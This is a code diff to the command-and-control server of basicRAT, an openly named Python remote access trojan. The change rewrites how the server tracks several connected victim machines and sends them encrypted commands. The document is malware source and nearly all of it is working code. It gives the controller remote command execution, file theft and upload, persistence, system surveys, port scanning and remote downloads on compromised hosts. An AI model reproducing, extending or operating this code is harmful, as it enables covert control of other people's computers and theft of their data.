@@ -7,12 +7,12 @@
 #
 
 import argparse
+import readline
 import socket
 import struct
 import sys
-import time
 import threading
-import base64
+import time
 
 from core import common
 from core import crypto
@@ -32,144 +32,115 @@ BANNER = '''
          https://github.com/vesche/basicRAT
 '''
 HELP_TEXT = '''
+client <id>         - Connect to a client.
+clients             - List connected clients.
 download <files>    - Download file(s).
 help                - Show this help menu.
+kill                - Kill the client connection.
 persistence         - Apply persistence mechanism.
-quit                - Gracefully kill client and server.
+quit                - Exit the server and end all client connections.
 rekey               - Regenerate crypto key.
 run <command>       - Execute a command on the target.
 scan <ip>           - Scan top 25 ports on a single host.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
-wget <url>          - Download a file from the web.
-clients             - List connected clients
-client <id>         - Connect to client'''
-COMMANDS = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
-             'scan', 'survey', 'unzip', 'upload', 'wget',"exit", "clients", "client", "terminate"]
+wget <url>          - Download a file from the web.'''
+COMMANDS = [ 'client', 'clients', 'download', 'help', 'kill', 'persistence',
+             'quit', 'rekey', 'run', 'scan', 'survey', 'unzip', 'upload',
+             'wget' ]
 
 
 class Server(threading.Thread):
-    host = "0.0.0.0"  # Get local machine name
-    clients = []
-    alive = True
-    client_counter = 0
-
+    clients      = []
+    alive        = True
+    client_count = 1
+    
     def __init__(self, port):
         super(Server, self).__init__()
-        self.s = socket.socket()  # Create a socket object
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.s.bind((self.host, port))  # Bind to the port
-        self.s.listen(5)  # Now wait for client connection.
-        print 'Server started!'
-
+        self.s.bind(('0.0.0.0', port))
+        self.s.listen(5)
+    
     def run(self):
-        print 'Waiting for clients...'
         while True:
-            # Handle Incoming Connections
-            connection, client_address = self.s.accept()
-            address, port = client_address
-            print("Connection From: %s:%s" % (address, port))
-            self.add_client(connection, address)
-
-    def add_client(self, connection, client_address):
+            conn, addr = self.s.accept()
+            client = ClientConnection(conn, addr)
+            client_id = self.client_count
+            self.clients.append({'client_id': client_id, 'client': client})
+            self.client_count += 1
+    
+    def verify_client_id(self, client_id):
         try:
-            client = ClientConnection(connection, client_address)
-            client_id = self.client_counter
-            self.clients.append({"client_id": client_id,
-                                 "client": client})
-            self.client_counter += 1
-        except Exception as e:
-            print(e)
-        print(self.clients)
-
-    def get_client(self, client_id):
+            client_index = next(i for (i, d) in enumerate(self.clients) if \
+                           d['client_id'] == int(client_id))
+            return True, 'Client {} selected.'.format(client_id)
+        except (StopIteration, ValueError):
+            return False, 'Error: Invalid client ID.'
+    
+    def select_client(self, client_id):
         try:
-            return [c["client"] for c in self.clients if c["client_id"] == client_id][0]
-        except IndexError:
-            print("Could Not Find Client With ID: {}".format(client_id))
-
+            return self.clients[int(client_id)-1]['client']
+        except (ValueError, IndexError):
+            print 'Error: Invalid client ID.'
+            return
+    
     def get_clients(self):
-        return [c for c in self.clients if c["client"].alive]
-
-    def send_message(self, client_id, message):
-        client = self.get_client(client_id)
-        if not client.alive:
-            print("Client Not Connected")
-            return
-        client.send_message(message)
-
-    def upload(self, client_id, files):
-        client = self.get_client(client_id)
-        if not client.alive:
-            print("Client Not Connected")
-            return
-        client.send_file(files)
-
-    def download(self, client_id, files):
-        client = self.get_client(client_id)
-        if not client.alive:
-            print("Client Not Connected")
-            return
-        client.receive_file(files)
+        return [c for c in self.clients]
+    
+    def remove_client(self, conn):
+        conn_to_remove = next(i for i in self.clients if i['client'] == conn)
+        self.clients.remove(conn_to_remove)
 
 
-class ClientConnection(threading.Thread):
+class ClientConnection:
     alive = True
 
-    def __init__(self, connection, address):
-        super(ClientConnection, self).__init__()
-        self.connection = connection
-        self.address = address
-        self.dh_key = crypto.diffiehellman(self.connection, server=True)
-        self.start()
+    def __init__(self, conn, addr):
+        self.conn   = conn
+        self.addr   = addr
+        self.dh_key = crypto.diffiehellman(self.conn, server=True)
+    
+    def send(self, prompt, cmd, action):
+        if not self.alive:
+            print 'Error: Client not connected.'
+            return
+    
+        # kill client connection
+        if cmd == 'kill':
+            self.conn.close()
+            return
+        
+        # send prompt to client
+        self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
+        
+        # results of a command
+        if cmd == 'run':
+            recv_data = self.conn.recv(4096)
+            print crypto.AES_decrypt(recv_data, self.dh_key).rstrip()
+        
+        # download a file
+        elif cmd == 'download':
+            for fname in action.split():
+                fname = fname.strip()
+                filesock.recvfile(self.conn, fname, self.dh_key)
 
-    def send_message(self, message):
-        enc_message = crypto.AES_encrypt(base64.b64encode(message), self.dh_key)
-        self.connection.send(struct.pack('>I', len(enc_message)) + enc_message)
+        # send file
+        elif cmd == 'upload':
+            for fname in action.split():
+                fname = fname.strip()
+                filesock.sendfile(self.conn, fname, self.dh_key)
 
-    def run(self):
-        while self.alive:
-            # Handle Incoming Information
-            try:
-                msglen = struct.unpack('>I', self.connection.recv(4))[0]
-            except Exception as e:
-                print("Terminating connection thread ({})".format(self.address))
-                self.alive = False
-                continue
+        # regenerate DH key
+        elif cmd == 'rekey':
+            self.dh_key = crypto.diffiehellman(self.conn, server=True)
 
-            data = self.connection.recv(msglen)
-            data = base64.b64decode(crypto.AES_decrypt(data, self.dh_key))
-
-            cmd, _, action = data.partition(' ')
-            # Client Connection needs to be told to expect these actions
-            if cmd == "download":
-                filesock.recvfile(self.connection, action, self.dh_key)
-
-            elif cmd == "rekey":
-                self.dh_key = crypto.diffiehellman(self.connection, server=True)
-            # Dump any other output
-            else:
-                print(data)
-
-        print("Client Thread Terminated")
-
-    def send_file(self, files):
-        for fname in files.split():
-            fname = fname.strip()
-            self.send_message("upload %s" % fname)
-            filesock.sendfile(self.connection, fname, self.dh_key)
-
-    def receive_file(self, files):
-        for fname in files.split():
-            fname = fname.strip()
-            self.send_message("download %s" % fname)
-
-    def __str__(self):
-        return self.address
-
-    def __repr__(self):
-        return self.address
+        # results of survey, persistence, unzip, or wget
+        elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
+            print 'Running {}...'.format(cmd)
+            recv_data = self.conn.recv(1024)
+            print crypto.AES_decrypt(recv_data, self.dh_key)
 
 
 def get_parser():
@@ -183,19 +154,23 @@ def main():
     parser  = get_parser()
     args    = vars(parser.parse_args())
     port    = args['port']
-    current_client_id = "None"
+    
+    curr_client_id  = '?'
 
+    # print banner all sexy like
     for line in BANNER.split('\n'):
         time.sleep(0.05)
         print line
 
+    # start server
     server = Server(port)
     server.setDaemon(True)
     server.start()
+    print 'basicRAT server listening for connections on port {}.'.format(port)
 
-    print 'basicRAT server listening on port {}...'.format(port)
     while True:
-        prompt = raw_input('\n[{}] basicRAT> '.format(current_client_id)).rstrip()
+        prompt = raw_input('\n[{}] basicRAT> '.format(curr_client_id)).rstrip()
+
         # allow noop
         if not prompt:
             continue
@@ -208,44 +183,56 @@ def main():
             print 'Invalid command, type "help" to see a list of commands.'
             continue
 
-        elif cmd in ['quit', 'q', 'exit']:
-            sys.exit(0)
-
         # display help text
-        elif cmd == 'help':
+        if cmd == 'help':
             print HELP_TEXT
             continue
+        
+        # stop the server
+        elif cmd == 'quit':
+            quit_option = raw_input('Exit the server and end all client ' \
+                                    'connections (y/N)? ')
+            if quit_option[0].lower() == 'y':
+                # gracefull kill all clients here
+                sys.exit(0)
+            else:
+                continue
 
-        elif cmd == "clients":
-            print "ID  |  Client Address"
-            print "---------------------"
-            for client in server.get_clients():
-                print "%s  | %s" % (client["client_id"], client["client"])
+        # select client
+        elif cmd == 'client':
+            success, message = server.verify_client_id(action)
+            if success:
+                curr_client_id = action
+            print message
+            continue
+        
+        # list clients
+        elif cmd == 'clients':
+            print 'ID - Client Address'
+            for c in server.get_clients():
+                print '{:>2} - {}'.format(c['client_id'], c['client'].addr[0])
             continue
 
-        elif cmd == "client":
-            try:
-                current_client_id = int(action)
-            except Exception as e:
-                print("Invalid Client ID")
-
-        # Everything Below Here Requires A Client ID
-        if current_client_id == "None":
-            print("Please Set A Client ID (clients)")
+        # require client id
+        if curr_client_id == '?':
+            print 'Error: Invalid client ID.'
             continue
+        
+        # get client object based on current client id
+        client = server.select_client(curr_client_id)
+        
+        # send data to client
+        try:
+            client.send(prompt, cmd, action)
+        except (socket.error, ValueError):
+            print "Client {} disconnected.".format(curr_client_id)
+            cmd = 'kill'
+        
+        # reset client id if client killed
+        if cmd == 'kill':
+            server.remove_client(client)
+            curr_client_id = '?'
 
-        # download a file
-        elif cmd == 'download':
-            server.download(current_client_id, action
-                            )
-        elif cmd == 'upload':
-            server.upload(current_client_id, action)
-        else:
-            # send data to client
-            try:
-                server.send_message(current_client_id, prompt)
-            except Exception as e:
-                print("Failed To Send Message: %s" % e)
 
 if __name__ == '__main__':
     main()
